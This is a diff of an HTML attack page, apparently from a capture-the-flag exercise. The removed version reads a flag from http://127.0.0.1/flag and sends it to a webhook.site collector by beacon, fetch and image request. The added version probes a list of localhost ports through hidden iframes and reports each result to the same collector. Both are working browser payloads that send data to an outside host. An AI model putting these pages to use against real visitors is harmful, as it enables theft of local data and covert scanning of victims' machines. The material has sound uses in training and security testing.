@@ -1,36 +1,32 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <body>
-<h1>Firefox Leak</h1>
+<h1>FireLeak local port probe</h1>
+
 <script>
-// In Firefox, localhost might be treated specially
-async function leak() {
-  try {
-    const response = await fetch('http://127.0.0.1/flag', {
-      method: 'GET',
-      credentials: 'include'
-    });
+const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";
 
-    const flag = await response.text();
-
-    // Multiple exfiltration methods
-    // Method 1: Beacon (works in background)
-    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', flag);
-
-    // Method 2: Regular fetch
-    await fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310?flag=' + encodeURIComponent(flag));
-
-    // Method 3: Image
-    new Image().src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?f=' + btoa(flag);
-
-  } catch(err) {
-    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', 'Error: ' + err.message);
-  }
+function log(port, ev) {
+  fetch(`${endpoint}?kind=portscan&port=${port}&event=${ev}`).catch(() => {});
 }
 
-leak();
+function probePort(port) {
+  const ifr = document.createElement("iframe");
+  ifr.onload = () => log(port, "load");
+  ifr.onerror = () => log(port, "error");
+  ifr.src = `http://127.0.0.1:${port}/?cb=` + Math.random();
+  document.body.appendChild(ifr);
+}
+
+// add/remove ports as you like
+[
+  80, 81, 3000, 3001, 5000, 5001, 8000, 8001,
+  8080, 8081, 9000, 1337, 1338, 27017, 6379
+].forEach(probePort);
 </script>
+
 </body>
 </html>
+
 
 <!--const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";-->
